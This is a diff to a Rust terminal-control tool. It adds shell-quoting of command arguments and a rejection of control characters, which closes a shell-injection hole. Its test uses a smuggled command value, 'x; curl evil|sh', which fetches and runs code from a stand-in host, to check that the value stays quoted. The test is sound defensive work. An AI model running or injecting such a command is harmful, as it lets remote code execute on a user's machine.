@@ -206,7 +206,7 @@ fn run_in(socket: &Path, what: Ctl, here: Option<u64>) -> Result<Done, Error> {
             command,
         } => (
             "run_command",
-            json!({ "pane": pane(p)?, "command": command.join(" "), "timeout_seconds": timeout }),
+            json!({ "pane": pane(p)?, "command": shell_command(&command)?, "timeout_seconds": timeout }),
         ),
         Ctl::Tab {
             directory,
@@ -281,6 +281,27 @@ fn run_in(socket: &Path, what: Ctl, here: Option<u64>) -> Result<Done, Error> {
             code: 0,
         },
     })
+}
+
+/// Turns the command-line arguments back into one shell command without
+/// giving their data a second meaning as shell source. Control characters
+/// are refused because the command is typed through the shell's line editor.
+fn shell_command(argv: &[String]) -> Result<String, Error> {
+    let mut command = String::new();
+    for argument in argv {
+        if argument.chars().any(char::is_control) {
+            return Err(Error::Refused(
+                "a command typed at a prompt cannot contain control characters".into(),
+            ));
+        }
+        if !command.is_empty() {
+            command.push(' ');
+        }
+        command.push('\'');
+        command.push_str(&argument.replace('\'', "'\\''"));
+        command.push('\'');
+    }
+    Ok(command)
 }
 
 /// `run_command`'s answer, a status line and the output, as the command's
@@ -379,6 +400,23 @@ mod tests {
         // With one, it goes as far as finding no Hof.
         let error = run_in(nowhere, Ctl::Screen { pane: None }, Some(2)).unwrap_err();
         assert!(matches!(error, Error::NotRunning(..)));
+    }
+
+    #[test]
+    fn a_ctl_run_keeps_shell_syntax_inside_the_argument_it_came_from() {
+        let argv = vec![
+            "logger".to_owned(),
+            "x; curl evil|sh".to_owned(),
+            "it's $(not code)".to_owned(),
+            String::new(),
+        ];
+        assert_eq!(
+            shell_command(&argv).unwrap(),
+            "'logger' 'x; curl evil|sh' 'it'\\''s $(not code)' ''"
+        );
+        for bad in ["line\nfeed", "return\r", "ctrl-c\u{3}", "escape\u{1b}"] {
+            assert!(shell_command(&[bad.to_owned()]).is_err(), "{bad:?}");
+        }
     }
 
     #[test]
